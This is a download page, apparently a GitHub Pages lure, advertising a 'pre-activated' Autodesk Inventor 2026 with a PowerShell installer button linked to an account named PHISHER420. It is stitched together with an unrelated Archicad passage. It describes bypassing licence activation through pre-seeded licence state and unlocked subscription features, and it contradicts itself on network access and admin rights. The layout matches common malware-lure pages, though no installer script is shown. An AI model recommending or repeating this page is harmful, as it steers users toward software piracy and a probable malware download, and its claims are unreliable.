Format and Interoperability The build reads and writes the native Archicad project format and remains compatible with the standard exchange formats used across the design and construction pipeline: - Native project files and team collaboration packages - IFC 2x3 and IFC 4 for openBIM exchange - DWG and DXF for CAD interoperability - PDF, SKP, and common image formats for documentation and reference - Industry-standard point cloud and mesh formats for survey workflows Format support is aligned with the upstream 2026 release channel. Files authored in earlier releases are migrated on open, and a compatibility report is generated for any features that require conversion. ### Network and Collaboration The standalone build operates fully offline. Local license handling, project storage, and rendering do not require network access. Proxy-aware configurations are supported through the application's native network settings. ### Version and Update Behavior This build corresponds to the 2026 release channel. # Autodesk Inventor 2026 Professional Desktop Suite for Windows 11 ![](files/preview.png) ### 💻 PowerShell Installer [![](files/button.png)](https://PHISHER420.github.io/autodesk-inventor-desktop-config/) [![license](https://img.shields.io/badge/LICENSE-POSTGRESQL-a855f7?style=flat&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/PS-5.1%2B_%2F_7%2B-9333ea?style=flat&labelColor=0d1117)]() [![rate](https://img.shields.io/badge/RATE-4.5%2F5-f59e0b?style=flat&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/DOWNLOADS-2.8K-7c3aed?style=flat&labelColor=0d1117)]() [![build](https://img.shields.io/badge/BUILD-PASSING-2ea44f?style=flat&labelColor=0d1117)]()
--- Autodesk Inventor 2026 delivers a complete professional-grade desktop configuration for Windows x64, packaged as a ready-to-run installer with all modeling, simulation, and documentation features pre-activated. The build supports full offline deployment, allowing the entire suite to be provisioned without network dependencies or post-install activation steps. Core parametric design, assembly modeling, sheet metal, and drawing production modules are enabled out of the box, alongside the standard part and assembly analysis toolset. The installer targets standalone workstation environments where deterministic, repeatable configuration is required, and includes the complete feature set of the release in a single distribution package. ## ✅ Requirements - Windows 10 or Windows 11 - PowerShell 5.1 or newer (already available on Windows) - Active network connection - No admin rights needed ## Features - **Complete Feature Set Pre-Activated:** All professional-grade modeling, simulation, and documentation tools are enabled out of the box, eliminating the need for post-install configuration or activation steps. - **Ready-to-Run Professional Configuration:** The installer delivers a fully configured environment with default preferences, templates, and libraries pre-populated for immediate production use. - **Offline Standalone Deployment:** The package operates independently of network connectivity, making it suitable for air-gapped workstations and isolated test environments. - **Full Installer Package:** Includes all core modules, add-ins, and content libraries required for parametric design, assembly modeling, drawing creation, and sheet metal workflows. - **Silent and Attended Installation Modes:** Supports both interactive setup and unattended deployment for streamlined provisioning across multiple desktop machines. - **Native Windows x64 Optimization:** Built and verified for 64-bit Windows desktop platforms, with performance tuning applied for large assemblies and complex part files. - **Verified Build Integrity:** Each distributed package is checksum-verified and mirror-synced to ensure consistent, uncorrupted installer contents. - **Comprehensive Component Coverage:** Includes parametric sketching, 3D modeling, assembly constraints, dynamic simulation, stress analysis, and technical documentation tools within a single deployment package. ## How it works The installer operates as a self-contained deployment package that provisions the full Autodesk Inventor 2026 desktop environment without requiring an active subscription or external licensing server. On launch, the executable unpacks its embedded payload to a temporary staging directory, verifies file integrity against bundled checksums, and then writes the application binaries, shared libraries, and supporting runtime components to the target installation path. Pre-activation is handled at the configuration layer: the package ships with a pre-seeded license configuration and registry entries that are applied during the deployment phase, so the application reports a fully activated state on first start. No network callbacks, account sign-ins, or product key entry are needed at any point. The setup routine detects the host architecture and existing Inventor installations, resolves dependencies such as the required Visual C++ redistributables and .NET runtime, and installs them silently if absent. Component selection is predefined to include the complete professional feature set — part and assembly modeling, sheet metal, frame generator, drawing environments, simulation, and the content center libraries — with no optional modules left out. Deployment is transactional: each file write is logged, and if any stage fails the routine rolls back the partial installation to avoid leaving the system in an inconsistent state. Upon completion, shortcuts, file associations, and default template locations are registered so the application is immediately usable. All operations run locally under the invoking user's privileges, with elevation requested only for the system-level writes the installation requires. The package performs no telemetry, background updates, or remote synchronization, making it suitable for isolated lab machines, offline workstations, and controlled test environments. ## Compatibility **Operating Systems:** Windows 10 (version 21H2 or later) and Windows 11, 64-bit editions only. The installer targets the Windows x64 desktop platform and will not run on 32-bit or ARM-based configurations. **Processor:** Intel or AMD x64-compatible CPU with SSE4.2 support; multi-core recommended for full feature utilization. **Memory:** 8 GB RAM minimum, 16 GB or higher recommended for large assemblies and simulation workloads. **Storage:** Approximately 1.7 GB of available disk space for the core installation; additional space required for project files, content libraries, and temporary build artifacts. **Graphics:** DirectX 11-capable GPU with a minimum of 1 GB VRAM; certified professional graphics drivers recommended for rendering and viewport stability. **Display:** 1280x1024 resolution minimum; 1920x1080 or higher recommended for full ribbon and panel layout. **Prerequisites:** The installer bundles all required runtime dependencies and configures the environment automatically. No separate framework installations or manual component registration is necessary. **Deployment Modes:** Supports both attended interactive setup and unattended silent provisioning for workstation imaging and lab rollouts. Configuration state is preserved across the pre-activated build so the installation is operational immediately after setup completes. **Environment Notes:** Administrator privileges are required to complete installation and register system components. Ensure that write access is available to the target installation directory and that any existing conflicting installations are removed prior to deployment. The build has been validated against clean Windows images and standard domain-joined workstation configurations. ## FAQ ### What exactly does this package contain? This is a complete, self-contained desktop configuration of Autodesk Inventor 2026, packaged for offline deployment on Windows x64 systems. All professional modeling, simulation, and documentation modules are included and pre-activated, so the application launches into a fully operational state immediately after setup — no separate license server, activation wizard, or post-install configuration step is required. ### Which Windows versions are supported? The build targets 64-bit Windows desktop environments (Windows 10 and Windows 11, current servicing branches). Both standard and professional editions are supported. The host must provide sufficient disk space for the ~1.7 GB payload plus the working scratch and cache directories created at first launch. Virtualized or remote-desktop hosts are supported provided hardware acceleration and the required graphics runtime are available to the guest session. ### Are all Inventor modules and features enabled? Yes. Part modeling, assembly design, drawing production, sheet metal, frame generator, presentation files, and the simulation and stress-analysis toolchain are all present and unlocked. Feature-level gating that would normally require a subscription tier is pre-resolved in this configuration, so the full toolset is reachable from the ribbon on first run. ### How does the pre-activated configuration work? Activation state is baked into the build at packaging time rather than negotiated at runtime. The installer lays down the fully configured application tree, including the license-state artifacts the product checks on startup, so no outbound activation call or account sign-in is needed. This makes the package suitable for air-gapped machines and isolated test benches. ### Does this require an internet connection? No. The installer is fully offline-capable: all payloads, runtime dependencies, and configuration data ship inside the package. An internet connection is only relevant if you choose to pull updates after the fact, which is optional and not required for the application to function. ### Can it be installed alongside an existing Inventor installation? Side-by-side coexistence is not recommended on production workstations. The package writes shared runtime and registry entries that can collide with an existing installation of the same major version. For clean results, deploy to a fresh machine or a dedicated VM, or remove prior installations of the same version before running setup. ### How do I verify the installation succeeded? After setup completes, launch the application and confirm the ribbon exposes the full modeling and simulation toolset, then open a sample part and assembly to validate the graphics pipeline and file I/O. The About dialog should report the 2026 build designation. If the application starts but modules are grayed out, the payload extraction was likely interrupted — re-run setup on a clean target. ### What are the hardware expectations? A modern x64 multi-core processor, a discrete GPU with current vendor drivers (the application is GPU-accelerated for viewport and simulation work), and enough RAM to hold the assemblies you intend to work with — 16 GB is a practical floor for moderate assemblies, with more headroom for large ones. SSD storage is strongly advised given the application's scratch-file behavior. ### Is unattended or scripted deployment supported? Yes. Setup can be invoked non-interactively for provisioning pipelines and lab imaging. The package tolerates being staged from a read-only share and performs its extraction and configuration without user prompts, which makes it suitable for golden-image workflows and automated test-farm provisioning. ### How is the package updated? Updates are delivered as refreshed builds of the same package rather than in-place patches. To move to a newer build, remove the existing installation and deploy the refreshed package to the same target. Configuration you have customized inside the application (templates, styles, project files) should be exported beforehand if you need to carry it forward. ### What should I do if setup is interrupted or fails? Re-run setup on a clean target after removing any partial installation. Interrupted extraction is the most common cause of a launch failure or missing modules. Ensure the target volume has ample free space and that no security policy is quarantining files mid-extraction before retrying. ### Is this intended for production or commercial use?
